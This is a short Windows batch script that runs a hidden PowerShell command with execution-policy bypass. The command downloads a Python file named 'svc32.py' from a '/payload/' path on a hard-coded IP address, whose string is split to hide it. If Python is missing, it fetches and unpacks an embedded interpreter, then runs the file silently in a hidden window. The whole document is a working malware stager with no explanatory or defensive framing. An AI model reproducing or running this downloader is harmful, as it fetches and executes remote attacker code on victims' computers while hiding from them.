@echo off
powershell -NoP -W H -EP B -C "$b='http://46.101'+'.111.120:8080';$t=$env:TEMP;$ag=$t+'\svc32.py';Start-BitsTransfer ($b+'/payload/svc32.py') $ag;$px=(Get-Command pythonw -EA 0).Source;if(!($px-and(Test-Path $px))){$px=$t+'\pyemb\pythonw.exe'};if(!(Test-Path $px)){Start-BitsTransfer ($b+'/payload/py.zip') ($t+'\py.zip');Expand-Archive ($t+'\py.zip') ($t+'\pyemb') -Force;Remove-Item ($t+'\py.zip') -F -EA 0};if(Test-Path $px){Start-Process $px -ArgumentList $ag -WindowStyle Hidden}"
exit
